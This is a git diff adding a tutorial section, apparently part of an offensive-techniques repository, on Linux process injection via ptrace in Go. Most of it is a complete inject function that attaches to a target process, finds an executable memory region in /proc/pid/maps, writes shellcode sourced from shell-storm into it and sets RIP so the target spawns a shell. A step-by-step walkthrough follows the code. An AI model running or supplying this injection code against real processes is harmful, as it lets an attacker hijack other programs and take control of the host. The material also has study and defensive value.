@@ -74,3 +74,105 @@ SYS_EXECVEAT, --> This is the syscall
         0, --> we did not need to use this
 
 If successful, the function doesn't return because the current process image is replaced. If it fails, e is returned.
+
+
+# Process injection via Ptrace
+
+In the code directory, you will see infect.c which was used as a blueprint to make infect.go
+
+To try out infect.go first run ./binaries/pid. You will need this PID for the process injection. The 2 main imports are buffio to read from /proc/pid/maps. The reason we do this is so we can find a memory region that is rxp. Then we get to the shellcode. This shellcode was obtained from https://shell-storm.org/shellcode/files/shellcode-806.html if you are curious. 
+
+
+```go
+func inject(pid int) {
+	var regs syscall.PtraceRegs
+
+	// Attach to the target process
+	if err := syscall.PtraceAttach(pid); err != nil {
+		fmt.Printf("Failed to attach to process: %v\n", err)
+		os.Exit(1)
+	}
+	defer syscall.PtraceDetach(pid)
+
+	// Wait for the process to stop
+	if _, err := syscall.Wait4(pid, nil, 0, nil); err != nil {
+		fmt.Printf("Failed to wait for process: %v\n", err)
+		os.Exit(1)
+	}
+
+	// Get the current register state
+	if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
+		fmt.Printf("Failed to get register state: %v\n", err)
+		os.Exit(1)
+	}
+
+	// Parse /proc/[pid]/maps to find an executable memory region
+	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
+	file, err := os.Open(mapsPath)
+	if err != nil {
+		fmt.Printf("Failed to open maps file: %v\n", err)
+		os.Exit(1)
+	}
+	defer file.Close()
+
+	var address uintptr
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.Contains(line, "r-xp") {
+			parts := strings.Split(line, " ")
+			addrRange := strings.Split(parts[0], "-")
+			if len(addrRange) != 2 {
+				continue
+			}
+
+			addr, err := strconv.ParseUint(addrRange[0], 16, 64)
+			if err == nil {
+				address = uintptr(addr)
+				break
+			}
+		}
+	}
+
+	if address == 0 {
+		fmt.Println("Failed to find a suitable memory region for injection.")
+		os.Exit(1)
+	}
+
+	// Write the shellcode to the target process's memory
+	for i := 0; i < len(shellcode); i += 8 {
+		chunk := shellcode[i:]
+		if len(chunk) > 8 {
+			chunk = chunk[:8]
+		}
+		if _, err := syscall.PtracePokeData(pid, address+uintptr(i), chunk); err != nil {
+			fmt.Printf("Failed to write data to process memory: %v\n", err)
+			os.Exit(1)
+		}
+	}
+
+	// Modify the instruction pointer (RIP) to jump to the injected code
+	regs.Rip = uint64(address)
+	if err := syscall.PtraceSetRegs(pid, &regs); err != nil {
+		fmt.Printf("Failed to set register state: %v\n", err)
+		os.Exit(1)
+	}
+
+	fmt.Println("[*] Successfully injected shellcode!")
+}
+```
+
+The above code is the inject function which takes the PID. we init a variable called regs to hold the register state of the target process so we can modify rip.
+
+We then use syscall.PtraceAttach(pid) to attach to the target process. defer syscall.PtraceDetach() will also ensure that ptrace will detach from our target process after returning.
+
+We then use the wait syscall to wait for our process to stop.
+
+After that we open procpidmaps to find a list of memory regions that is rxp so we can inject the shellcode. When an executable region is found, the address is parsed and stored in a variable called address.
+
+We then use syscall.PtracePokeData() to write the shellcode to the target processes memory writing 8 bytes at a time. This is because pokedata operates in memory sized chinks (which is 8 bytes in 64 bit systems)
+
+Finally, we modify the RIP register to point to the start address of the injected shellcode and it we can get a shell. 
+
+
+
